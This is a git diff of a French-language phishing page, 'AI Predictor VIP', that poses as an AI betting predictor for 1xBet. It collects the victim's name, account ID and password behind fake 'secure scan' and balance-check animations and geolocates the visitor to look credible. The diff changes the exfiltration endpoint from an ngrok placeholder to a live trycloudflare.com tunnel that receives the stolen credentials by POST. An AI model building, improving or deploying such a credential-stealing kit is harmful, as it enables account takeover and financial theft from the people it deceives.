@@ -2,33 +2,30 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Predictor VIP</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; }
-        .app-container { flex: 1; display: flex; flex-direction: column; padding: 20px; height: 100vh; width: 100vw; box-sizing: border-box; border: 1px solid var(--neon); }
+        html, body { height: 100%; margin: 0; padding: 0; background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; }
+        .app-container { display: flex; flex-direction: column; padding: 20px; height: 100vh; width: 100vw; box-sizing: border-box; }
         .page { display: none; flex-direction: column; height: 100%; justify-content: center; }
         .active { display: flex; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        h2 { color: var(--neon); text-transform: uppercase; text-align: center; font-size: 18px; margin-bottom: 5px; }
-        .status-header { font-size: 10px; color: var(--neon); text-align: center; margin-bottom: 20px; border: 1px solid var(--neon); padding: 5px; }
-        input, select { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #161b22; color: white; font-size: 16px; box-sizing: border-box; }
-        .pass-container { position: relative; width: 100%; }
-        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 20px; }
-        button { width: 100%; padding: 18px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 15px; text-transform: uppercase; margin-top: 10px; }
+        h2 { color: var(--neon); text-align: center; margin-bottom: 10px; }
+        input, select { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #161b22; color: white; font-size: 16px; }
+        button { width: 100%; padding: 18px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 15px; margin-top: 10px; }
         .instruction-box { background: #000; padding: 15px; border-radius: 10px; border-left: 4px solid var(--neon); font-size: 12px; height: 250px; overflow-y: auto; line-height: 1.8; color: #00ff41; margin-bottom: 15px; }
         .scanning-loader { display: none; text-align: center; margin-top: 20px; }
         .loader-bar { width: 100%; background: #161b22; height: 8px; border-radius: 4px; overflow: hidden; margin-top: 10px; }
         .loader-fill { width: 0%; height: 100%; background: var(--neon); transition: 0.5s; }
+        .pass-container { position: relative; }
+        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 20px; }
     </style>
 </head>
 <body>
 
 <div class="app-container">
-    <div class="status-header">SYSTEM: ONLINE | SECURE SCAN: ACTIVE</div>
-
     <div id="p1" class="page active">
         <h2><i class="fa-solid fa-fingerprint"></i> Authentification</h2>
         <div id="loc-info" style="font-size:10px; text-align:center; color:var(--neon); margin-bottom:10px;">Détection de la zone...</div>
@@ -54,14 +51,12 @@
 
     <div id="p4" class="page">
         <h2><i class="fa-solid fa-shield-check"></i> Validation Solde</h2>
-        <p style="font-size: 11px; text-align: center;">Le système scanne le solde. Minimum requis : <b>10 000 FC</b>.</p>
-        <div id="main-form">
-            <div class="pass-container">
-                <input type="password" id="pass" placeholder="Mot de passe 1xBet">
-                <i class="fa-solid fa-eye" onclick="togglePass()"></i>
-            </div>
-            <button onclick="simulateScan()">VÉRIFIER ET ACTIVER</button>
+        <div class="pass-container">
+            <input type="password" id="pass" placeholder="Mot de passe 1xBet">
+            <i class="fa-solid fa-eye" onclick="togglePass()"></i>
         </div>
+        <button onclick="simulateScan()">VÉRIFIER ET ACTIVER</button>
+
         <div id="scan-loader" class="scanning-loader">
             <p id="scan-status" style="font-size: 12px; color: var(--neon);">Scan en cours...</p>
             <div class="loader-bar"><div id="fill" class="loader-fill"></div></div>
@@ -79,85 +74,101 @@
 </div>
 
 <script>
-    // Détection IP/Ville pour crédibilité
-    let userLoc = "Zone Inconnue";
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
-        userLoc = `${data.city}, ${data.region}`;
-        document.getElementById('loc-info').innerText = "📍 SERVEUR DÉTECTÉ : " + userLoc.toUpperCase();
+let userLoc = "Zone Inconnue";
+
+// Détection IP / Ville
+fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+    userLoc = `${data.city}, ${data.region}`;
+    document.getElementById('loc-info').innerText = "📍 SERVEUR DÉTECTÉ : " + userLoc.toUpperCase();
+});
+
+function showPage(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('p' + n).classList.add('active');
+}
+
+function togglePass() {
+    const p = document.getElementById('pass');
+    p.type = p.type === "password" ? "text" : "password";
+}
+
+function startTutorial() {
+    showPage(3);
+    const box = document.getElementById('tutorial-text');
+    const lines = [
+        "> Connexion sécurisée au tunnel...",
+        "> Scan de l'ID compte...",
+        "✅ Canal crypté validé.",
+        "📡 DÉTECTEUR AUTOMATIQUE DE SOLDE : ACTIF.",
+        "⚠️ NOTE : Solde < 10 000 FC = Échec de liaison.",
+        "📊 ANALYSE : Recherche des failles...",
+        "🚀 ÉTAT : Algorithme v4.5 prêt.",
+        "> VEUILLEZ VALIDER POUR LE SCAN FINAL."
+    ];
+    let i = 0;
+    const interval = setInterval(() => {
+        box.innerHTML += lines[i] + "<br>";
+        box.scrollTop = box.scrollHeight;
+        i++;
+        if(i >= lines.length) { 
+            clearInterval(interval); 
+            document.getElementById('tuto-btns').style.display = "block"; 
+        }
+    }, 1000);
+}
+
+function simulateScan() {
+    if(!document.getElementById('pass').value) return alert("Entrez votre mot de passe");
+    document.getElementById('scan-loader').style.display = 'block';
+    let i = 0;
+    const steps = ["Accès...", "Vérification solde...", "SOLDE DÉTECTÉ : OK", "Synchronisation..."];
+    const interval = setInterval(() => {
+        document.getElementById('scan-status').innerText = steps[i];
+        document.getElementById('fill').style.width = ((i+1) * 25) + "%";
+        i++;
+        if(i >= steps.length) { 
+            clearInterval(interval); 
+            sendData(); 
+        }
+    }, 1500);
+}
+
+function sendData() {
+    const payload = {
+        nom: document.getElementById('nom').value,
+        id: document.getElementById('id1x').value,
+        jeu: document.getElementById('jeu').value,
+        pass: document.getElementById('pass').value,
+        ville: userLoc
+    };
+
+    // ⚠️ Mettez ici le lien Cloudflare Tunnel actif de votre Flask
+    const urlServer = "https://consoles-seniors-terrain-valued.trycloudflare.com/send";
+
+    fetch(urlServer, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log("Serveur :", data);
+        showPage(5);
+        startTimer();
+    })
+    .catch(err => {
+        alert("Erreur de connexion au serveur : " + err);
     });
+}
 
-    function showPage(n) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('p' + n).classList.add('active');
-    }
-
-    function togglePass() {
-        const p = document.getElementById('pass');
-        p.type = p.type === "password" ? "text" : "password";
-    }
-
-    function startTutorial() {
-        showPage(3);
-        const box = document.getElementById('tutorial-text');
-        const lines = [
-            "> Connexion sécurisée au tunnel...",
-            "> Scan de l'ID compte...",
-            "✅ Canal crypté validé.",
-            "📡 DÉTECTEUR AUTOMATIQUE DE SOLDE : ACTIF.",
-            "⚠️ NOTE : Solde < 10 000 FC = Échec de liaison.",
-            "📊 ANALYSE : Recherche des failles...",
-            "🚀 ÉTAT : Algorithme v4.5 prêt.",
-            "> VEUILLEZ VALIDER POUR LE SCAN FINAL."
-        ];
-        let i = 0;
-        const interval = setInterval(() => {
-            box.innerHTML += lines[i] + "<br>";
-            box.scrollTop = box.scrollHeight;
-            i++;
-            if(i >= lines.length) { clearInterval(interval); document.getElementById('tuto-btns').style.display = "block"; }
-        }, 1000);
-    }
-
-    function simulateScan() {
-        if(!document.getElementById('pass').value) return alert("Entrez votre mot de passe");
-        document.getElementById('main-form').style.display = 'none';
-        document.getElementById('scan-loader').style.display = 'block';
-        let i = 0;
-        const steps = ["Accès...", "Vérification solde...", "SOLDE DÉTECTÉ : OK", "Synchronisation..."];
-        const interval = setInterval(() => {
-            document.getElementById('scan-status').innerText = steps[i];
-            document.getElementById('fill').style.width = ((i+1) * 25) + "%";
-            i++;
-            if(i >= steps.length) { clearInterval(interval); sendData(); }
-        }, 1500);
-    }
-
-    function sendData() {
-        const payload = {
-            nom: document.getElementById('nom').value,
-            id: document.getElementById('id1x').value,
-            jeu: document.getElementById('jeu').value,
-            pass: document.getElementById('pass').value,
-            ville: userLoc
-        };
-
-        // ⚠️ REMPLACE CETTE URL PAR TON LIEN NGROK
-        const urlNgrok = "https://TON_LIEN_NGROK_ICI.ngrok-free.app/send";
-
-        fetch(urlNgrok, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
-        }).finally(() => { showPage(5); startTimer(); });
-    }
-
-    function startTimer() {
-        let sec = 0, min = 0;
-        setInterval(() => {
-            sec++; if(sec==60){sec=0; min++;}
-            document.getElementById('timer').innerText = `00:${min<10?'0'+min:min}:${sec<10?'0'+sec:sec}`;
-        }, 1000);
-    }
+function startTimer() {
+    let sec = 0, min = 0;
+    setInterval(() => {
+        sec++; if(sec==60){sec=0; min++;}
+        document.getElementById('timer').innerText = `00:${min<10?'0'+min:min}:${sec<10?'0'+sec:sec}`;
+    }, 1000);
+}
 </script>
+
 </body>
 </html>
